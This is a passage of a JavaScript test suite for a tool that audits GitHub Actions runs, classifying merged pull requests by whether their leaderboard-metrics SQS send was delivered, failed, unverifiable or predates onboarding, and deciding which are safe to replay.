    run(1, '8e27899b22b4091667b39ea3487c51dbb3855e35', 'success', '2026-07-01T00:00:10Z'),
  ]);
  assert.throws(() => classify(prs, byHead, null, NOW), /share head_sha 8e27899b/);
  assert.throws(() => classify(prs, byHead, null, NOW), /#2938, #2939/);
});

test('classify: the collision guard names the CONSEQUENCE, not just the collision', () => {
  // Asserted separately from the identifiers because the identifiers are what a
  // future refactor keeps and the explanation is what it drops. An operator who
  // sees only "share head_sha" has no reason to think the report is unsafe.
  const prs = [pr(1, '2026-07-01T00:00:00Z', 'dupsha'), pr(2, '2026-07-01T00:00:00Z', 'dupsha')];
  const byHead = dedupeByHead([run(1, 'dupsha', 'success', '2026-07-01T00:00:10Z')]);
  assert.throws(() => classify(prs, byHead, null, NOW), /would read as delivered/);
});

test('classify: a collision with NO run on the shared SHA does not refuse the audit', () => {
  // The live regression the run-existence predicate fixes, as a test. This is
  // guard's real Aug-2025 pair, and both of its shared SHAs report total_count 0 —
  // with no run to credit, each PR is classified from its own merged_at and no
  // verdict can cross between them. The first version of this guard threw here
  // anyway and took out the whole wide-window historical audit that ENG-5775 needs.
  const prs = [
    pr(2938, '2025-08-25T21:26:59Z', '8e27899b22b4091667b39ea3487c51dbb3855e35'),
    pr(2939, '2025-08-21T16:52:50Z', '8e27899b22b4091667b39ea3487c51dbb3855e35'),
  ];
  const out = classify(prs, new Map(), Date.parse('2026-01-01T00:00:00Z'), NOW);
  assert.equal(out.pre_onboarding.length, 2);
  assert.equal(out.never_fired.length, 0);
});

test('classify: onboarding does NOT make a collision safe', () => {
  // This test refuted a wrong version of the guard, so it is kept as the pin. The
  // narrowing was first written as "2+ colliding PRs past onboarding", on the
  // reasoning that a pre-onboarding PR never consults byHead. It does: the
  // `pre_onboarding` bucket is only reachable inside the `!run` branch, so with a
  // run present the 2025 PR here is credited `delivered` — silently dropping a PR
  // that genuinely needs backfilling off the replay list. Hence the predicate is
  // run-existence, and this mixed pair must still refuse.
  const prs = [
    pr(1, '2025-08-25T00:00:00Z', 'sharedsha'),
    pr(2, '2026-06-01T00:00:00Z', 'sharedsha'),
  ];
  const byHead = dedupeByHead([run(9, 'sharedsha', 'success', '2026-06-01T00:00:10Z')]);
  assert.throws(
    () => classify(prs, byHead, Date.parse('2026-01-01T00:00:00Z'), NOW),
    /share head_sha sharedsh/,
  );
  // And the pre-onboarding PR is named in the refusal, since it is the one whose
  // verdict was about to be wrong.
  assert.throws(() => classify(prs, byHead, Date.parse('2026-01-01T00:00:00Z'), NOW), /#1, #2/);
});

test('classify: two merged PRs on DIFFERENT head_shas are not a collision', () => {
  // The control. Without it the guard could throw on every multi-PR input and
  // every test above would still pass, since they would all be throwing too.
  const prs = [pr(1, '2026-07-01T00:00:00Z', 'shaone'), pr(2, '2026-07-01T00:00:00Z', 'shatwo')];
  const out = classify(prs, new Map(), Date.parse('2026-01-01T00:00:00Z'), NOW);
  assert.equal(out.never_fired.length, 2);
});

test('classify: the SAME sha appearing once is not a collision', () => {
  // The other control: a single PR must not trip a count-based guard.
  const prs = [pr(1, '2026-07-01T00:00:00Z', 'lonesha')];
  const byHead = dedupeByHead([run(1, 'lonesha', 'success', '2026-07-01T00:00:10Z')]);
  const out = classify(prs, byHead, null, NOW);
  assert.deepEqual(
    out.delivered.map((r) => r.number),
    [1],
  );
});

// onboardedAt talks to the API, so these use a stub client rather than mocking
// fetch — same stance as runsInRange's tests. The stub mirrors ghPaged's real
// contract in the two ways this code depends on: `pluck` runs against each page
// BODY, and multiple pages are concatenated. Detail fixtures are therefore an
// ARRAY OF PAGE BODIES, so the rename probe's pagination is traversed here rather
// than assumed — a single-object fixture could not tell a paging probe from a
// first-page-only one.
const commitsClient = (commits, detailPagesBySha) => {
  const urls = [];
  return {
    urls,
    ghPaged: async (url, pluck) => {
      urls.push(url);
      const pages = url.includes('?path=')
        ? [commits]
        : detailPagesBySha[url.split('/').pop()] || [];
      return pages.flatMap((body) => (pluck ? pluck(body) : body));
    },
  };
};

const ONBOARD_CFG = {
  owner: 'praetorian-inc',
  callerPath: '.github/workflows/leaderboard-metrics.yml',
};

test('onboardedAt: a caller that arrived by RENAME throws instead of dating onboarding late', async () => {
  const client = commitsClient(
    [
      { sha: 'renamesha', commit: { committer: { date: '2026-07-07T00:00:00Z' } } },
      { sha: 'latersha', commit: { committer: { date: '2026-07-10T00:00:00Z' } } },
    ],
    {
      renamesha: [
        {
          files: [
            {
              filename: '.github/workflows/leaderboard-metrics.yml',
              status: 'renamed',
              previous_filename: '.github/workflows/leaderboard.yml',
            },
          ],
        },
      ],
    },
  );
  await assert.rejects(() => onboardedAt(client, ONBOARD_CFG, 'somerepo'), /arrived by RENAME/);
  // The previous path is the actionable part: without it the operator cannot
  // re-run to cover the earlier period, and the throw is just an obstacle. The
  // quotes are asserted, not tolerated: this is a pasteable command carrying a
  // filename from the AUDITED REPO, so unquoting it is a regression even though
  // this fixture's filename is benign.
  await assert.rejects(
    () => onboardedAt(client, ONBOARD_CFG, 'somerepo'),
    /--caller-path '\.github\/workflows\/leaderboard\.yml'/,
  );
});

test('onboardedAt: an ADDED caller returns the earliest date and does not throw', async () => {
  // Control for the test above. The status literal matters: keying the guard on
  // `previous_filename` alone would fire on any commit the API annotates.
  const client = commitsClient(
    [
      { sha: 'addsha', commit: { committer: { date: '2026-07-07T00:00:00Z' } } },
      { sha: 'editsha', commit: { committer: { date: '2026-07-10T00:00:00Z' } } },
    ],
    {
      addsha: [
        { files: [{ filename: '.github/workflows/leaderboard-metrics.yml', status: 'added' }] },
      ],
    },
  );
  assert.equal(await onboardedAt(client, ONBOARD_CFG, 'somerepo'), '2026-07-07T00:00:00Z');
});

test('onboardedAt: the rename probe reads the EARLIEST commit, not the first returned', async () => {
  // The commits endpoint returns newest-first, so a guard that probed
  // `commits[0]` would inspect the most recent edit and never see the rename.
  // Ordering here is deliberately newest-first, as the real API returns it.
  const client = commitsClient(
    [
      { sha: 'newest', commit: { committer: { date: '2026-07-10T00:00:00Z' } } },
      { sha: 'oldest', commit: { committer: { date: '2026-07-07T00:00:00Z' } } },
    ],
    {
      newest: [
        { files: [{ filename: '.github/workflows/leaderboard-metrics.yml', status: 'modified' }] },
      ],
      oldest: [
        {
          files: [
            {
              filename: '.github/workflows/leaderboard-metrics.yml',
              status: 'renamed',
              previous_filename: '.github/workflows/old-name.yml',
            },
          ],
        },
      ],
    },
  );
  await assert.rejects(() => onboardedAt(client, ONBOARD_CFG, 'somerepo'), /old-name\.yml/);
});

test('onboardedAt: no commits at the caller path returns null without a detail call', async () => {
  const urls = [];
  const client = {
    ghPaged: async (url) => {
      urls.push(url);
      return [];
    },
  };
  assert.equal(await onboardedAt(client, ONBOARD_CFG, 'somerepo'), null);
  // Exactly one call: the commits-by-path query. A probe that ran anyway would
  // dereference an undefined `earliest` and turn "never onboarded" into a crash.
  assert.equal(urls.length, 1);
});

test('onboardedAt: the rename probe pages past the first COMMIT_FILES_CAP files', async () => {
  // This is why the probe reads the detail with ghPaged and not gh. A fleet-wide
  // migration commit — the very kind that introduced most of these callers —
  // touches more files than one response carries, and a first page that simply
  // lacks our path is byte-indistinguishable from a commit that never touched it.
  // Read one page only and the probe answers "not a rename" precisely on the
  // largest commits, which is the silent direction. Page 1 is sized at the real
  // measured boundary rather than a round number, so the fixture stays a fixture
  // of the API and not of this test.
  const page1 = {
    files: Array.from({ length: COMMIT_FILES_CAP }, (_, i) => ({
      filename: `unrelated/file-${i}.md`,
      status: 'modified',
    })),
  };
  const page2 = {
    files: [
      {
        filename: '.github/workflows/leaderboard-metrics.yml',
        status: 'renamed',
        previous_filename: '.github/workflows/buried.yml',
      },
    ],
  };
  const client = commitsClient([{ sha: 'bigsha', commit: { committer: { date: '2026-07-07T00:00:00Z' } } }], {
    bigsha: [page1, page2],
  });
  await assert.rejects(
    () => onboardedAt(client, ONBOARD_CFG, 'somerepo'),
    /--caller-path '\.github\/workflows\/buried\.yml'/,
  );
});

test('onboardedAt: a page-1-only reader would have passed this fixture', async () => {
  // The control that gives the test above its meaning: the SAME 300-file first
  // page with no rename anywhere returns a date and does not throw. So the
  // rejection above is caused by page 2's content, not by the page count or the
  // fixture's size — without this, a guard that threw on any large commit would
  // pass both.
  const page1 = {
    files: Array.from({ length: COMMIT_FILES_CAP }, (_, i) => ({
      filename: `unrelated/file-${i}.md`,
      status: 'modified',
    })),
  };
  const page2 = {
    files: [{ filename: '.github/workflows/leaderboard-metrics.yml', status: 'added' }],
  };
  const client = commitsClient([{ sha: 'bigsha', commit: { committer: { date: '2026-07-07T00:00:00Z' } } }], {
    bigsha: [page1, page2],
  });
  assert.equal(await onboardedAt(client, ONBOARD_CFG, 'somerepo'), '2026-07-07T00:00:00Z');
});

// ── the run-history horizon (unverifiable) ────────────────────────────────────

test('classify: a merged PR with no run PAST the run-history horizon is unverifiable, not never_fired', () => {
  // The direction is the whole point. never_fired is on the replay list, so a PR
  // whose run RECORD was reaped — indistinguishable from one that never ran —
  // would be re-delivered to the prod queue, and consumer-side idempotency is not
  // established (ENG-5789).
  const merged = '2025-01-01T00:00:00Z';
  const prs = [pr(7, merged, 'reapedsha')];
  const mergedTs = Date.parse(merged);

  const past = classify(prs, new Map(), null, mergedTs + (RUN_HISTORY_DAYS + 1) * 86400000);
  assert.deepEqual(past.unverifiable.map((r) => r.number), [7]);
  assert.deepEqual(past.never_fired, []);

  // The control, one day inside: the SAME fixture must still be never_fired, or
  // the assertion above would hold for a classifier that simply never emits
  // never_fired at all.
  const inside = classify(prs, new Map(), null, mergedTs + (RUN_HISTORY_DAYS - 1) * 86400000);
  assert.deepEqual(inside.never_fired.map((r) => r.number), [7]);
  assert.deepEqual(inside.unverifiable, []);
});

test('classify: the horizon is EXCLUSIVE at exactly RUN_HISTORY_DAYS', () => {
  // Pins which side of the boundary the equality case falls on, so the branch
  // cannot be flipped from > to >= without a failure.
  const merged = '2025-01-01T00:00:00Z';
  const prs = [pr(7, merged, 'edgesha')];
  const at = classify(prs, new Map(), null, Date.parse(merged) + RUN_HISTORY_DAYS * 86400000);
  assert.deepEqual(at.never_fired.map((r) => r.number), [7]);
  assert.deepEqual(at.unverifiable, []);
});

test('classify: pre_onboarding OUTRANKS the horizon', () => {
  // Both branches apply to an ancient PR with no run. pre_onboarding is decided
  // by GIT history, which does not expire, so it stays the sound verdict out
  // there — and it is the more useful one, because it says a backfill is owed
  // rather than "someone go look this up by hand".
  const merged = '2025-01-01T00:00:00Z';
  const prs = [pr(7, merged, 'ancientsha')];
  const c = classify(
    prs,
    new Map(),
    Date.parse('2025-06-01T00:00:00Z'),
    Date.parse(merged) + (RUN_HISTORY_DAYS + 1) * 86400000,
  );
  assert.deepEqual(c.pre_onboarding.map((r) => r.number), [7]);
  assert.deepEqual(c.unverifiable, []);
});

test('classify: a PR past the horizon WITH a run row is classified from the run, not withheld', () => {
  // The horizon only governs the absence of a row. A row that still exists is
  // evidence regardless of age, and treating age as authoritative would discard
  // the wide historical audit ENG-5775 needs.
  const merged = '2025-01-01T00:00:00Z';
  const prs = [pr(7, merged, 'oldsha')];
  const byHead = new Map([['oldsha', run(1, 'oldsha', 'failure', '2025-01-01T01:00:00Z')]]);
  const c = classify(prs, byHead, null, Date.parse(merged) + (RUN_HISTORY_DAYS + 5) * 86400000);
  assert.deepEqual(c.failed.map((r) => r.number), [7]);
  assert.deepEqual(c.unverifiable, []);
});

test('replayList: unverifiable is NOT replayable', () => {
  // Asserting the exclusion directly rather than trusting the classes object's
  // shape: replayList spreads three named lists, and adding a fourth is a
  // one-word edit that would silently start writing to the prod queue.
  const classes = {
    failed: [{ number: 1 }],
    never_fired: [{ number: 2 }],
    skipped_anomaly: [{ number: 3 }],
    payload_missing: [{ number: 4 }],
    in_flight: [{ number: 5 }],
    unverifiable: [{ number: 6 }],
    pre_onboarding: [{ number: 7 }],
  };
  assert.deepEqual(replayList(classes), [1, 2, 3]);
});

test('renderMarkdown: unverifiable is named on the CLEAN branch', () => {
  const md = renderMarkdown(
    {
      since: '2025-01-01',
      totals: { merged_prs: 10, delivered: 8, unverifiable: 2 },
      unverifiable_reasons: [UNVERIFIABLE_REAPED],
      repos_with_gaps: [],
      repos: [{ repo: 'guard', has_caller: true }],
    },
    CFG,
  );
  assert.match(md, /No gaps among the PRs this audit can decide/);
  assert.match(md, /\*\*2\*\* cannot be decided from the Actions API — merged more than 400 days ago/);
  assert.match(md, /NOT replayable/);
  // The unqualified sentence must NOT appear: it is the false-clean this class
  // exists to prevent.
  assert.doesNotMatch(md, /No gaps\. Every merged PR/);
});

test('renderMarkdown: undecided classes are named on the GAPS branch too', () => {
  // The round-6 fix built the clean sentence from the totals but left the gaps
  // branch hand-written, so a fleet where ONE repo has a gap printed that repo's
  // table and said nothing at all about another repo's 29 pre_onboarding or any
  // unverifiable PRs — the same omission, on the other branch.
  const md = renderMarkdown(
    {
      since: '2025-01-01',
      totals: { merged_prs: 40, delivered: 8, pre_onboarding: 29, in_flight: 1, unverifiable: 2 },
      unverifiable_reasons: [UNVERIFIABLE_REAPED],
      repos_with_gaps: [
        { repo: 'guard', failed: 1, never_fired: 0, skipped_anomaly: 0, replay: [5] },
      ],
      repos: [{ repo: 'guard', has_caller: true }],
    },
    CFG,
  );
  assert.match(md, /Fleet-wide, and separate from the gaps below/);
  assert.match(md, /\*\*29\*\* merged before this repo had a caller/);
  assert.match(md, /\*\*2\*\* cannot be decided from the Actions API — merged more than 400 days ago/);
  assert.match(md, /\*\*1\*\* are not yet decided/);
});

test('undecidedCaveats: BOTH causes are named when both are present', () => {
  // The reason this is data and not prose. The sentence used to name the 400-day
  // reaping as THE cause; round 9 added a second one (an attempt whose jobs list
  // could not be read), at which point the old sentence was false for every
  // record of the new kind — a closed count in prose, the same defect shape as a
  // false universal.
  const [line] = undecidedCaveats({ unverifiable: 3 }, [
    UNVERIFIABLE_JOBS_UNREADABLE,
    UNVERIFIABLE_REAPED,
  ]);
  assert.match(line, /\*\*3\*\* cannot be decided from the Actions API — /);
  assert.ok(line.includes(UNVERIFIABLE_JOBS_UNREADABLE), line);
  assert.ok(line.includes(UNVERIFIABLE_REAPED), line);
  assert.match(line, /; or /);
});

test('undecidedCaveats: with no reasons the sentence claims no particular cause', () => {
  // The fallback must not reach for either cause: naming one over a record set
  // that carries neither is exactly the over-claim this rewrite removed.
  const [line] = undecidedCaveats({ unverifiable: 1 });
  assert.match(line, /for want of a readable run record/);
  assert.doesNotMatch(line, /400 days/);
  assert.doesNotMatch(line, /attempt/);
});

test('undecidedCaveats: the two report branches share one source', () => {
  // Both branches call this, so a class added to one is added to both. Asserting
  // the shared function rather than two rendered strings is what makes that
  // structural instead of a coincidence of two greps.
  const totals = { pre_onboarding: 3, in_flight: 2, unverifiable: 1 };
  assert.equal(undecidedCaveats(totals).length, 3);
  assert.deepEqual(undecidedCaveats({}), []);
  // Zero counts are omitted, not printed as "0 are not yet decided".
  assert.deepEqual(undecidedCaveats({ in_flight: 0, pre_onboarding: 0, unverifiable: 0 }), []);
});

test('renderMarkdown: a gap repo lists its undecidable PR numbers and no replay for them', () => {
  const md = renderMarkdown(
    {
      since: '2025-01-01',
      totals: { merged_prs: 40, delivered: 8, unverifiable: 2 },
      repos_with_gaps: [
        {
          repo: 'guard',
          failed: 1,
          never_fired: 0,
          skipped_anomaly: 0,
          unverifiable: 2,
          unverifiable_prs: [77, 78],
          unverifiable_reasons: [UNVERIFIABLE_JOBS_UNREADABLE, UNVERIFIABLE_REAPED],
          replay: [5],
        },
      ],
      repos: [{ repo: 'guard', has_caller: true }],
    },
    CFG,
  );
  assert.match(md, /undecidable by the Actions API \(not a gap, not replayed\) \| 2 \|/);
  assert.match(md, /Undecidable PRs \(2\): #77, #78/);
  // Both causes, one bullet each, under the table — and the ROW LABEL names
  // neither, because it used to name reaping as though it were the only one.
  assert.ok(md.includes(`- ${UNVERIFIABLE_JOBS_UNREADABLE}`), md);
  assert.ok(md.includes(`- ${UNVERIFIABLE_REAPED}`), md);
  assert.doesNotMatch(md, /undecidable, run record reaped/);
  // The replay command covers the real gap only.
  assert.match(md, /pr_numbers='5'/);
});

test('renderMarkdown: a gap repo with no recorded reasons promises no enumeration', () => {
  // The conditional colon. A paragraph ending "…from the records themselves:"
  // with nothing after it reads as a rendering bug to an operator and hides that
  // the records carried no reason at all.
  const md = renderMarkdown(
    {
      since: '2025-01-01',
      totals: { merged_prs: 40, delivered: 8, unverifiable: 1 },
      repos_with_gaps: [
        {
          repo: 'guard',
          failed: 1,
          never_fired: 0,
          skipped_anomaly: 0,
          unverifiable: 1,
          unverifiable_prs: [77],
          replay: [5],
        },
      ],
      repos: [{ repo: 'guard', has_caller: true }],
    },
    CFG,
  );
  assert.match(md, /Undecidable PRs \(1\): #77/);
  assert.doesNotMatch(md, /from the records themselves/);
});

// ── prior run attempts ───────────────────────────────────────────────────────

// A client stub whose gh() answers from a path -> body map, recording what was
// asked. Anything unmapped answers __missing, so an unexpected call is visible as
// a behaviour change rather than as a silent undefined.
const attemptClient = (map) => {
  const asked = [];
  return {
    asked,
    gh: async (p) => {
      asked.push(p);
      return map[p] ?? { __missing: true };
    },
  };
};

const jobsWithStep = (conclusion) => ({
  total_count: 1,
  jobs: [{ steps: [{ name: SQS_STEP, conclusion }] }],
});

// The shape of a run that died BEFORE the send: jobs readable, no SQS step at
// all. This is the ordinary failed run, not the rename signal — 8 of 25 sampled
// guard failures look exactly like this.
const jobsDiedEarly = () => ({
  total_count: 1,
  jobs: [{ steps: [{ name: 'Set up job', conclusion: 'failure' }] }],
});

const ACFG = { owner: 'praetorian-inc' };

// recoverHiddenDeliveries probes the CURRENT run before walking attempts, so
// every fixture below has to answer that call. Answering `skipped` keeps these
// tests about the attempt walk: the current run did not send, so the walk runs.
const CURRENT = (runId, body = jobsWithStep('skipped')) => ({
  [`/repos/praetorian-inc/guard/actions/runs/${runId}/jobs?per_page=100`]: body,
});

test('recoverHiddenDeliveries: a SUCCESSFUL earlier attempt that sent moves the PR to delivered', () => {
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 2 }],
    skipped_anomaly: [],
    payload_missing: [],
  };
  const client = attemptClient({
    ...CURRENT(900),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1/jobs?per_page=100': jobsWithStep('success'),
  });

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.failed, []);
    assert.deepEqual(classes.delivered.map((r) => r.number), [5]);
    assert.equal(classes.delivered[0].recovered_attempt, 1);
    // And therefore off the replay list, which is the consequence that matters.
    assert.equal(replayList({ ...classes, never_fired: [], skipped_anomaly: [] }).includes(5), false);
  });
});

test('recoverHiddenDeliveries: a successful earlier attempt that sent NOTHING becomes payload_missing', () => {
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 2 }],
    skipped_anomaly: [],
    payload_missing: [],
  };
  const client = attemptClient({
    ...CURRENT(900),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1/jobs?per_page=100': jobsWithStep('skipped'),
  });

  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.delivered, []);
    assert.deepEqual(classes.payload_missing.map((r) => r.number), [5]);
    assert.equal(classes.payload_missing[0].payload, 'missing');
  });
});

test('recoverHiddenDeliveries: attempt 1 is not probed at all', () => {
  // Cost control AND a correctness pin: there is no attempt 0, so a loop that
  // probed it would 404 on every ordinary failed run in the fleet.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 1 }],
    skipped_anomaly: [],
    payload_missing: [],
  };
  const client = attemptClient(CURRENT(900));
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    // The current run's own jobs, and NOTHING else: no /attempts/ path at all.
    assert.deepEqual(client.asked, ['/repos/praetorian-inc/guard/actions/runs/900/jobs?per_page=100']);
    assert.deepEqual(classes.failed.map((r) => r.number), [5]);
  });
});

test('recoverHiddenDeliveries: no earlier attempt sent, so the PR stays failed', () => {
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 3 }],
    skipped_anomaly: [],
    payload_missing: [],
    unverifiable: [],
  };
  const client = attemptClient({
    ...CURRENT(900),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/2': { conclusion: 'failure' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/2/jobs?per_page=100': jobsDiedEarly(),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1': { conclusion: 'startup_failure' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1/jobs?per_page=100': jobsDiedEarly(),
  });
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.failed.map((r) => r.number), [5]);
    assert.deepEqual(classes.delivered, []);
    // Current run FIRST, then walked DOWNWARD from run_attempt - 1, stopping at
    // 1 — and each NON-SUCCESS attempt's jobs are read, not skipped over on the
    // strength of its conclusion. That skip was the round-9 defect: the send is
    // the last authored step, so post-job cleanup or a cancellation fails an
    // attempt that already sent.
    assert.deepEqual(client.asked, [
      '/repos/praetorian-inc/guard/actions/runs/900/jobs?per_page=100',
      '/repos/praetorian-inc/guard/actions/runs/900/attempts/2',
      '/repos/praetorian-inc/guard/actions/runs/900/attempts/2/jobs?per_page=100',
      '/repos/praetorian-inc/guard/actions/runs/900/attempts/1',
      '/repos/praetorian-inc/guard/actions/runs/900/attempts/1/jobs?per_page=100',
    ]);
  });
});

test('recoverHiddenDeliveries: a NON-SUCCESS earlier attempt that sent still moves the PR to delivered', () => {
  // The round-9 finding in its own right. Every attempt of a `failed` row is
  // non-success by construction (a success would have won dedupeByHead), so an
  // attempt walk that skipped non-success attempts could not rescue ANY of them
  // — the walk was there and the population it could act on was empty.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 2 }],
    skipped_anomaly: [],
    payload_missing: [],
    unverifiable: [],
  };
  const client = attemptClient({
    ...CURRENT(900),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1': { conclusion: 'cancelled' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1/jobs?per_page=100': jobsWithStep('success'),
  });
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.failed, []);
    assert.deepEqual(classes.delivered.map((r) => r.number), [5]);
    assert.equal(classes.delivered[0].recovered_attempt, 1);
    assert.equal(replayList({ ...classes, never_fired: [], skipped_anomaly: [] }).includes(5), false);
  });
});

test('recoverHiddenDeliveries: an unreadable attempt makes the PR unverifiable, not failed', () => {
  // The old behaviour `continue`d and left the record `failed`, with a comment
  // calling that "over-reporting, never a silent double-delivery". False in the
  // writing direction: `failed` is ON the replay list, and replaying is what
  // writes to the prod queue. So an unreadable attempt used to manufacture a
  // duplicate write. `unverifiable` is excluded from replayList — that is the
  // whole point of the class.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 2 }],
    skipped_anomaly: [],
    payload_missing: [],
    unverifiable: [],
  };
  const client = attemptClient(CURRENT(900));
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.failed, []);
    assert.deepEqual(classes.unverifiable.map((r) => r.number), [5]);
    assert.equal(classes.unverifiable[0].unverifiable_reason, UNVERIFIABLE_JOBS_UNREADABLE);
    assert.equal(
      replayList({ ...classes, never_fired: [], skipped_anomaly: [] }).includes(5),
      false,
    );
  });
});

test('recoverHiddenDeliveries: an unreadable attempt does NOT abort the audit', () => {
  // The other half of the same decision, and the reason the fatal/non-fatal
  // split exists at all: widening the walk to siblings and to every attempt
  // widens it onto exactly what GitHub reaps FIRST, so a throw here would take
  // out a whole fleet audit because one year-old attempt aged out.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 2 }],
    skipped_anomaly: [],
    payload_missing: [],
    unverifiable: [],
  };
  const client = attemptClient(CURRENT(900));
  return assert.doesNotReject(() => recoverHiddenDeliveries(client, ACFG, 'guard', classes));
});

test('recoverHiddenDeliveries: an unreadable attempt does not fabricate payload_missing', () => {
  // A successful attempt whose JOBS cannot be read must not become
  // payload_missing: that is a definite "this PR's author has no score" claim,
  // and it would rest on a list nobody read. Only a POSITIVE not_sent earns it.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 2 }],
    skipped_anomaly: [],
    payload_missing: [],
    unverifiable: [],
  };
  const client = attemptClient({
    ...CURRENT(900),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1': { conclusion: 'success' },
    // no .../attempts/1/jobs entry — the jobs list is gone
  });
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.payload_missing, []);
    assert.deepEqual(classes.unverifiable.map((r) => r.number), [5]);
  });
});

test('recoverHiddenDeliveries: one unreadable attempt outranks a POSITIVE not_sent on the same row', () => {
  // The ordering decision this round reversed, and the one a mutation showed was
  // untested: every fixture above has EITHER an unreadable attempt OR a readable
  // successful one, never both, so `unreadable && ownLatestSuccess === null` — the
  // old order — passed the whole suite.
  //
  // Attempt 2 is readable, concluded success and sent nothing, which is a positive
  // not_sent and on its own earns payload_missing. Attempt 1's jobs are gone. The
  // claim payload_missing makes is "this PR delivered nothing", and attempt 1 is a
  // place a send could be hiding, so that claim is not established — even though
  // the evidence FOR it was read and the evidence against it was not.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 3 }],
    skipped_anomaly: [],
    payload_missing: [],
    unverifiable: [],
  };
  const client = attemptClient({
    ...CURRENT(900),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/2': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/2/jobs?per_page=100': jobsWithStep('skipped'),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1': { conclusion: 'success' },
    // no .../attempts/1/jobs entry — the jobs list is gone
  });
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.payload_missing, []);
    assert.deepEqual(classes.unverifiable.map((r) => r.number), [5]);
    assert.equal(classes.unverifiable[0].unverifiable_reason, UNVERIFIABLE_JOBS_UNREADABLE);
    // Undecided loses no information and costs no write; payload_missing sends an
    // operator to edit ENGINEER_EMAIL_MAP and re-run, and the re-run writes to the
    // prod queue. Neither class is replayed on this report.
    assert.equal(replayList({ ...classes, never_fired: [], skipped_anomaly: [] }).includes(5), false);
  });
});

test('recoverHiddenDeliveries: a SUCCESSFUL attempt with no send step is a rename, not a payload gap', () => {
  // requireStep is derived from the conclusion of the thing being probed, and a
  // mutation showed the ATTEMPT half of that was untested: hardcoding
  // `requireStep: false` there kept the suite green, which turns the rename
  // detector off for every earlier attempt in the fleet — and then reports the
  // renamed step as `payload_missing`, i.e. a fleet-wide false claim that authors
  // have no score, with a map edit as the suggested repair.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 2 }],
    skipped_anomaly: [],
    payload_missing: [],
    unverifiable: [],
  };
  const client = attemptClient({
    ...CURRENT(900),
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1': { conclusion: 'success' },
    // Readable, and the SQS step is simply not among them.
    '/repos/praetorian-inc/guard/actions/runs/900/attempts/1/jobs?per_page=100': jobsDiedEarly(),
  });
  return assert.rejects(
    () => recoverHiddenDeliveries(client, ACFG, 'guard', classes),
    new RegExp(`no step named "${SQS_STEP}"`),
  );
});

test('recoverHiddenDeliveries: skipped_anomaly is recovered too, since it is also replayed', () => {
  const classes = {
    delivered: [],
    failed: [],
    skipped_anomaly: [{ number: 8, run_id: 901, conclusion: 'skipped', run_attempt: 2 }],
    payload_missing: [],
  };
  const client = attemptClient({
    ...CURRENT(901),
    '/repos/praetorian-inc/guard/actions/runs/901/attempts/1': { conclusion: 'success' },
    '/repos/praetorian-inc/guard/actions/runs/901/attempts/1/jobs?per_page=100': jobsWithStep('success'),
  });
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.skipped_anomaly, []);
    assert.deepEqual(classes.delivered.map((r) => r.number), [8]);
  });
});

// ── the CURRENT run's own send, behind a non-success conclusion ───────────────

test("recoverHiddenDeliveries: the current run's OWN successful send moves the PR to delivered", () => {
  // The third member of the hidden-delivery class. The SQS step is the last
  // AUTHORED step, but harden-runner, configure-aws-credentials and checkout all
  // register post-job cleanup that runs after it — and a cancellation lands the
  // same way. So a run can send and still conclude failure/cancelled.
  const classes = {
    delivered: [],
    failed: [{ number: 5, run_id: 900, conclusion: 'failure', run_attempt: 1 }],
    skipped_anomaly: [],
    payload_missing: [],
  };
  const client = attemptClient(CURRENT(900, jobsWithStep('success')));
  return recoverHiddenDeliveries(client, ACFG, 'guard', classes).then(() => {
    assert.deepEqual(classes.failed, []);
    assert.deepEqual(classes.delivered.map((r) => r.number), [5]);
    // The conclusion is RECORDED, not erased: the report has to be able to say
    // why a delivered PR carries a failed run.
    assert.equal(classes.delivered[0].sent_despite_conclusion, 'failure');
    // Off the replay list — the consequence that matters, since replaying is the
    // only direction that writes to the prod queue.
    assert.equal(replayList({ ...classes, never_fired: [], skipped_anomaly: [] }).includes(5), false);
  });
});

test('recoverHiddenDeliveries: a rescued current run costs NO attempt probes', () => {
